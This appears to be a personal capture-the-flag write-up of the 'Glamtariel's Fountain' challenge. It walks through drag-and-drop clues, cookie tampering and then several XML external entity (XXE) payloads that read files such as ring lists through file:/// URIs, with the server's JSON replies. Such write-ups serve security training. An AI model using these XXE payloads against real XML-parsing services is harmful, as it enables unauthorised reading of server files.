# Glamtariel's Fountain Challenge

Explain that I had to drag things into either Glamtariel herself or her fountain. The CAPITAL LETTERS were clues as to what to focus on for each part of the challenge. You reach part two of the challenge when all you have to offer Glamtariel and her fountain are a set of 4 rings.

The opening image:
![The Fountain](/img/fountain/fountain1.png)

Click on Santa...
![The Fountain](/img/fountain/fountain2.png)

Click the candy cane...
![The Fountain](/img/fountain/fountain3.png)

Drag santa to the cake...
![The Fountain](/img/fountain/fountain4.png)

Drag the ice to the cake:
![The Fountain](/img/fountain/fountain5.png)

Drag the elf to the cake...
![The Fountain](/img/fountain/fountain6.png)

Drag the candy cane to the cake...
![The Fountain](/img/fountain/fountain7.png)

Drag santa to Glamtariel...
![The Fountain](/img/fountain/fountain8.png)

Drag the ice cube to Glamtariel...
![The Fountain](/img/fountain/fountain9.png)

Drag the candy can to Glamtariel...
![The Fountain](/img/fountain/fountain10.png)

Drag the elf to Glamtariel...
![The Fountain](/img/fountain/fountain11.png)

Changes the icons! WTF

Drag the weird puck thing to the cake:
![The Fountain](/img/fountain/fountain12.png)

Drag the sailboat to the cake:
![The Fountain](/img/fountain/fountain13.png)

![The Fountain](/img/fountain/fountain14.png)


SIMPLE FORMAT
TYPE


Tampering with the `MiniLembanh` cookie

![The Fountain](/img/fountain/fountain15.png)

Stuck here:
```
Content-Type: application/xml


<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE foo [

	<!ELEMENT visit ANY >

<!ENTITY xxe SYSTEM "file:///static/js/ringlist.js">]>

<root>

<imgDrop>&xxe;</imgDrop>

<who>princess</who>

<reqType>xml</reqType>

<visit>

&xxe;

</visit>

</root>
```

After a while, THIS is what FINALLY WORKED.

I hate these CTF challenges. such a waste of time.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE imgDrop [
<!ELEMENT imgDrop ANY >
<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
```

Replied with:

```json
{
  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
  "droppedOn": "none",
  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}
```

The image in question:

![The Fountain](/img/fountain/fountain16.png)

Changing the XXE a little bit gives me more info:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE imgDrop [
<!ELEMENT imgDrop ANY >
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt" >]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
```

```json
{
  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```

Glamtarial was talking about a silver ring, so...

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE imgDrop [
<!ELEMENT imgDrop ANY >
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
```

```json
{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}
```

The plot thickens...

![The Fountain](/img/fountain/fountain17.png)


Searched for that file, and now we're up to this...

```json
{
  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
  "droppedOn": "none",
  "visit": "none"
}
```

Interesting easter egg...

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE imgDrop [
<!ELEMENT imgDrop ANY >
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/greenring.txt" >]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
```

```json
{
  "appResp": "Hey, who is this guy? He doesn't have a ticket!^I don't remember seeing him in the movies!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png,230px,30px"
}
```

Homage to Tom Bombadil of Tolkien fame:

![The Fountain](/img/fountain/fountain18.png)

FINALLY...

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE imgDrop [
<!ELEMENT imgDrop ANY >
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<root>
    <imgDrop>img1</imgDrop>
    <reqType>&xxe;</reqType>
    <who>princess</who>
</root>
```

so FREAKIN ANNOYING

```json
{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}
```

![The Fountain](/img/fountain/fountain19.png)